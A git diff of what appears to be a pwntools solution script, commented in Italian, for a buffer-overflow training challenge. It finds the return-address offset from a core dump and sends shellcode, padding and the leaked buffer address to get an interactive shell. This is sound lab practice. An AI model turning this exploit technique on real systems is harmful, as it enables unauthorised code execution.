@@ -25,16 +25,17 @@ elf = ELF('/challenge/toddlerone-level-2-0')
 # =========================================================== #
 
 # Avvio del processo con 'setuid = false' per generare il memory core dump 
-p = elf.process(setuid=False)
+p_dump = elf.process(setuid=False)
 
 # Invio di una cyclic string per far crashare il processo e ottenere il memory core dump 
-p.sendline(b'512')
-p.sendline(cyclic(512,n=8))
-p.wait()
+p_dump.sendline(b'512')
+p_dump.sendline(cyclic(512, n=8)) # n = 8 (byte) per la dimensione degli indirizzi
+p_dump.wait()
 
 # Uso del memory core dump generato per calcolare la dimensione del buffer
-core_dump = p.corefile.fault_addr
+core_dump = p_dump.corefile.fault_addr
 delta_len = cyclic_find(core_dump, n=8)
+print(f'\nDistanza tra buffer e return address: {delta_len}\n')
 
 # =========================================================== #
 # =========================================================== #
@@ -46,6 +47,7 @@ p = elf.process()
 # Lettura dell'indirizzo di inizio del buffer
 p.recvuntil(b'The input buffer begins at 0x')
 addr = p.recvuntil(b',').decode()[:-1]
+print(f'Indirizzo del buffer: 0x{addr}\n')
 buffer_addr = p64(int(addr, 16)) # p64 = trasformazione in byte
 
 # Creazione dello shellcode
@@ -57,6 +59,6 @@ padding = b'A' * (delta_len - len(shellcode)) # Creazione del padding tra lo she
 bytestream = shellcode + padding + buffer_addr
 
 # Interazione con il processo e invio del bytestream
-p.sendline(f'{len(bytestream)}')
+p.sendline(f'{len(bytestream)}'.encode())
 p.sendline(bytestream)
 p.interactive()
